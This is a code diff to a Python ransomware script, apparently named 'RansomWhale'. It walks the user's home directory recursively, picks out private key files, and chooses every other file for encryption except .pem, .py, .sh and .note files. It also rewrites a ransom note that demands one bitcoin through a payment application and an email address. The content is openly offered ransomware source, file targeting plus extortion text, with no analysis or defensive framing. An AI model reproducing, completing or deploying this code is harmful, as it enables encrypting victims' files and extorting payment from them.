@@ -32,13 +32,14 @@ files = glob.glob(f'{homeDir}/**/*.*', recursive=True) #grabs files we want to e
  
 #///###########[Targeting Files]###########\\\#
 file_list=[]
-important = [] #where we store our key? work in progress
+important = [] #Key Storage
+excluded_extensions = [".pem", ".py", ".sh", ".note"] #important for RansomWhale
 for filename in files:
     if "private_key" in filename:   
         important.append(filename)
         print ("I see you have a private key, let me validate that for you...")
 
-    elif ".pem" not in filename and "HomeworkHeroes" not in filename and ".sh" not in filename and ".note" not in filename:    #This makes sure we do not accidentally Encrypt things victim needs
+    elif not any(extension in filename for extension in excluded_extensions): #Simplified logic: This makes sure we do not accidentally Encrypt things victim needs for RansomWhale
         file_list.append(filename)
 ###############################################
 
@@ -129,7 +130,7 @@ if len(important) == 0:  #if we dont see a private_key file, we want to encrypt 
     
     ransomNote="""
     Attention, your Personal Files have been Encrypted with a Government Grade Encryption System.
-    Please send 1btc to [wallet address] along with proof of purchase. 
+    Please send 1btc using the payment application along with proof of purchase. 
     to our email paymentsRansom@gmail.com. Processing could take between 2 - 5 buisness days.
     Thank you for your understanding.
     """
